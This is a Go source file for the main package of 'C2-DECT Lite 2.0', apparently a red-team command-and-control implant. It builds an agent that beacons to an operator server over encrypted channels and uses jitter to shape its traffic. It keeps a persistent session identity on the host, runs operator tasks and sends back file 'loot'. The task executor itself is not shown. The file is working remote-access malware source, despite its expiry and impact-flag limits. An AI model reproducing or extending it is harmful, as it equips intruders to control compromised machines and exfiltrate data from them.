// Package main implements the C2-DECT Lite 2.0 agent.
//
// The agent beacons to the operator server, executes the tasks it receives
// and returns the results. The transport is encrypted with ECDH P-256 and
// AES-256-GCM, the session identity survives a restart and the beacon timing
// is shaped by a jitter model with exponential backoff on failures.
package main

import (
	"crypto/ecdh"
	cryptorand "crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Version is the agent version reported to the server.
const Version = "2.0.0"

// Config holds the runtime configuration of the agent.
type Config struct {
	ServerURL   string
	ServerPort  uint16
	UseTLS      bool
	InsecureTLS bool
	SleepSec    uint32
	Jitter      uint32
	JitterMode  JitterMode
	Token       string
	ExpiryUnix  int64
	StatePath   string
	ChunkSize   int
	HTTPTimeout time.Duration
	Verbose     bool
	AllowImpact bool

	SessionID   string
	PrivateKey  *ecdh.PrivateKey
	ServerPub   *ecdh.PublicKey
	AESKey      []byte
	SessionUUID string
}

// envelope is the transport frame shared with the server.
type envelope struct {
	SessionID string      `json:"session_id"`
	PublicKey string      `json:"public_key,omitempty"`
	Agent     *hello      `json:"agent,omitempty"`
	Data      string      `json:"data,omitempty"`
}

// hello is the plaintext first contact.
type hello struct {
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	InternalIP string `json:"internal_ip"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	PID        int    `json:"pid"`
	Process    string `json:"process"`
	SleepSec   int    `json:"sleep_sec"`
	Jitter     int    `json:"jitter"`
	Version    string `json:"agent_version"`
	ExpiryUnix int64  `json:"expiry_unix"`
	Token      string `json:"token,omitempty"`
}

// body is the encrypted payload.
type body struct {
	Type       string `json:"type"` // checkin | result
	Hello      *hello `json:"hello,omitempty"`
	TaskID     int64  `json:"task_id,omitempty"`
	Output     string `json:"output,omitempty"`
	Error      string `json:"error,omitempty"`
	Success    bool   `json:"success,omitempty"`
	ChunkIndex int    `json:"chunk_index,omitempty"`
	ChunkTotal int    `json:"chunk_total,omitempty"`
	LootType   string `json:"loot_type,omitempty"`
	LootName   string `json:"loot_name,omitempty"`
	LootData   string `json:"loot_data,omitempty"`
}

// ack is the answer of the server to a checkin.
type ack struct {
	Type      string     `json:"type"`
	SessionID string     `json:"session_id"`
	UUID      string     `json:"uuid"`
	SleepSec  int        `json:"sleep_sec"`
	Jitter    int        `json:"jitter"`
	ServerTime string    `json:"server_time"`
	TenantID  int64      `json:"tenant_id"`
	Task      *taskSpec  `json:"task,omitempty"`
	Profile   *profile   `json:"profile,omitempty"`
}

// taskSpec is a unit of work.
type taskSpec struct {
	ID      int64  `json:"id"`
	Command string `json:"command"`
	Args    string `json:"args"`
}

// profile is the traffic profile handed to the agent.
type profile struct {
	Name        string            `json:"name"`
	Method      string            `json:"method"`
	URIs        []string          `json:"uris"`
	UserAgents  []string          `json:"user_agents"`
	Headers     map[string]string `json:"headers"`
	Cookies     map[string]string `json:"cookies"`
	ContentType string            `json:"content_type"`
	EncodeMode  string            `json:"encode_mode"`
	Prepend     string            `json:"prepend"`
	Append      string            `json:"append"`
}

func main() {
	cfg := Config{
		ServerURL:   "127.0.0.1",
		ServerPort:  8443,
		SleepSec:    10,
		Jitter:      30,
		JitterMode:  JitterActivity,
		ChunkSize:   256 * 1024,
		HTTPTimeout: 30 * time.Second,
	}

	flagServer := flag.String("s", "127.0.0.1", "server host or address of the operator server")
	flagPort := flag.Int("p", 8443, "port of the operator server")
	flagSleep := flag.Int("S", 10, "beacon interval in seconds")
	flagJitter := flag.Int("j", 30, "jitter percentage")
	flagJitterMode := flag.String("m", string(JitterActivity), "jitter model: uniform, activity or none")
	flagToken := flag.String("T", "", "bootstrap token that binds the agent to a tenant")
	flagExpiry := flag.Int64("e", 0, "absolute expiry of the agent (unix timestamp)")
	flagState := flag.String("f", "", "path of the state file holding the session identity")
	flagTLS := flag.Bool("tls", false, "use HTTPS instead of HTTP")
	flagInsecure := flag.Bool("k", false, "accept self signed certificates (lab only)")
	flagVerbose := flag.Bool("v", false, "print the beacon statistics")
	flagImpact := flag.Bool("allow-impact", false, "allow the commands with impact level (shell, kill, rm, mv); off by default")
	flag.Parse()

	cfg.ServerURL = *flagServer
	cfg.ServerPort = uint16(*flagPort)
	cfg.SleepSec = uint32(*flagSleep)
	cfg.Jitter = uint32(*flagJitter)
	cfg.JitterMode = JitterMode(*flagJitterMode)
	cfg.Token = *flagToken
	cfg.ExpiryUnix = *flagExpiry
	cfg.StatePath = *flagState
	cfg.UseTLS = *flagTLS
	cfg.InsecureTLS = *flagInsecure
	cfg.Verbose = *flagVerbose
	cfg.AllowImpact = *flagImpact

	if cfg.SleepSec < 1 {
		cfg.SleepSec = 1
	}
	if cfg.Jitter > 100 {
		cfg.Jitter = 100
	}
	if _, ok := parseJitterMode(string(cfg.JitterMode)); !ok {
		fmt.Fprintf(os.Stderr, "[-] unknown jitter mode %q, using %q\n", cfg.JitterMode, JitterActivity)
		cfg.JitterMode = JitterActivity
	}
	if cfg.StatePath == "" {
		cfg.StatePath = defaultStatePath()
	}

	// --- identity -------------------------------------------------------
	if err := loadState(&cfg); err != nil {
		fmt.Fprintf(os.Stderr, "[-] could not load the session state: %v\n", err)
	}
	if cfg.PrivateKey == nil {
		key, err := ecdh.P256().GenerateKey(cryptorand.Reader)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] key generation failed: %v\n", err)
			os.Exit(1)
		}
		cfg.PrivateKey = key
	}
	if cfg.SessionID == "" {
		cfg.SessionID = buildSessionID()
	}
	_ = saveState(&cfg)

	fmt.Printf("[*] C2-DECT Lite agent %s\n", Version)
	fmt.Printf("[*] server   %s\n", cfg.baseURL())
	fmt.Printf("[*] session  %s\n", cfg.SessionID)
	fmt.Printf("[*] sleep    %ds (jitter %d%%, mode %s)\n", cfg.SleepSec, cfg.Jitter, cfg.JitterMode)
	fmt.Printf("[*] impacto %s\n", impactLabel(cfg.AllowImpact))
	if cfg.ExpiryUnix > 0 {
		fmt.Printf("[*] expiry   %s\n", time.Unix(cfg.ExpiryUnix, 0).UTC().Format(time.RFC3339))
	}
	if cfg.Token != "" {
		fmt.Printf("[*] tenant   bootstrap token supplied\n")
	}
	fmt.Println()

	client := newClient(&cfg)
	rng := newJitterRand()

	failures := 0
	for {
		if expired(cfg.ExpiryUnix) {
			fmt.Println("[!] the agent reached its expiry date, terminating")
			return
		}

		task, err := client.checkin(&cfg)
		if err != nil {
			if errors.Is(err, errRekeyRequired) {
				// The server asked for a new transport key, retry at once.
				continue
			}
			failures++
			wait := backoffDuration(cfg.SleepSec, failures)
			fmt.Fprintf(os.Stderr, "[!] beacon failed (%v), retrying in %s\n", err, wait)
			time.Sleep(wait)
			continue
		}
		if failures > 0 {
			fmt.Printf("[+] reconnected after %d failed beacons\n", failures)
			failures = 0
		}

		if task != nil {
			runTask(&cfg, client, task)
		}

		sleep := NextInterval(int64(cfg.SleepSec)*1000, cfg.Jitter, cfg.JitterMode, time.Now(), rng)
		if cfg.Verbose {
			fmt.Printf("[*] next beacon in %s\n", time.Duration(sleep)*time.Millisecond)
		}
		time.Sleep(time.Duration(sleep) * time.Millisecond)
	}
}

// baseURL returns the operator server URL.
func (c *Config) baseURL() string {
	scheme := "http"
	if c.UseTLS {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%d", scheme, c.ServerURL, c.ServerPort)
}

// buildSessionID builds a readable session identifier.
func buildSessionID() string {
	hostname, _ := os.Hostname()
	buf := make([]byte, 4)
	_, _ = cryptorand.Read(buf)
	return fmt.Sprintf("%s_%s", hostname, hex.EncodeToString(buf))
}

// defaultStatePath returns the path of the state file.
func defaultStatePath() string {
	base, err := os.UserHomeDir()
	if err != nil {
		base = os.TempDir()
	}
	return filepath.Join(base, ".c2-dect-lite", "agent.json")
}

// state is the persisted identity of the agent.
type state struct {
	SessionID    string `json:"session_id"`
	PrivateKey   string `json:"private_key"`
	ServerPub    string `json:"server_public_key"`
	SessionUUID  string `json:"session_uuid"`
	CreatedAt    string `json:"created_at"`
}

func loadState(cfg *Config) error {
	data, err := os.ReadFile(cfg.StatePath)
	if err != nil {
		return err
	}
	var st state
	if err := json.Unmarshal(data, &st); err != nil {
		return err
	}
	cfg.SessionID = st.SessionID
	cfg.SessionUUID = st.SessionUUID
	if st.PrivateKey != "" {
		raw, err := hex.DecodeString(st.PrivateKey)
		if err != nil {
			return err
		}
		key, err := ecdh.P256().NewPrivateKey(raw)
		if err != nil {
			return err
		}
		cfg.PrivateKey = key
	}
	if st.ServerPub != "" {
		raw, err := hex.DecodeString(st.ServerPub)
		if err == nil {
			if pub, err := ecdh.P256().NewPublicKey(raw); err == nil {
				cfg.ServerPub = pub
			}
		}
	}
	return nil
}

func saveState(cfg *Config) error {
	if cfg.PrivateKey == nil {
		return errors.New("no private key")
	}
	st := state{
		SessionID:   cfg.SessionID,
		PrivateKey:  hex.EncodeToString(cfg.PrivateKey.Bytes()),
		SessionUUID: cfg.SessionUUID,
		CreatedAt:   time.Now().UTC().Format(time.RFC3339),
	}
	if cfg.ServerPub != nil {
		st.ServerPub = hex.EncodeToString(cfg.ServerPub.Bytes())
	}
	data, err := json.MarshalIndent(st, "", "  ")
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(cfg.StatePath), 0700); err != nil {
		return err
	}
	return os.WriteFile(cfg.StatePath, data, 0600)
}

// runTask executes one task and returns the result.
func runTask(cfg *Config, client *client, task *taskSpec) {
	output, errStr, success := execute(cfg, task)
	if errStr != "" {
		fmt.Fprintf(os.Stderr, "[!] task %d failed: %s\n", task.ID, errStr)
	}
	lootType, lootName, lootData := collectLoot(cfg, task, output)
	_ = client.sendResult(cfg, task.ID, output, errStr, success, lootType, lootName, lootData)
}

// collectLoot extracts a binary artifact from a task result.
func collectLoot(cfg *Config, task *taskSpec, output string) (string, string, string) {
	if task.Command != "download" {
		return "", "", ""
	}
	if output == "" {
		return "", "", ""
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(output))
	if err != nil {
		return "", "", ""
	}
	return "file", filepath.Base(task.Args), base64.StdEncoding.EncodeToString(raw)
}

// expired reports whether an absolute expiry has been reached.
func expired(expiryUnix int64) bool {
	if expiryUnix <= 0 {
		return false
	}
	return time.Now().UTC().Unix() >= expiryUnix
}

// impactLabel describes the impact level the agent was started with.
func impactLabel(allowed bool) string {
	if allowed {
		return "HABILITADO (shell, kill, rm, mv)"
	}
	return "REDUCIDO (shell, kill, rm y mv bloqueados: use -allow-impact)"
}

// atoi is a forgiving integer parser.
func atoi(raw string) int {
	v, err := strconv.Atoi(strings.TrimSpace(raw))
	if err != nil {
		return 0
	}
	return v
}
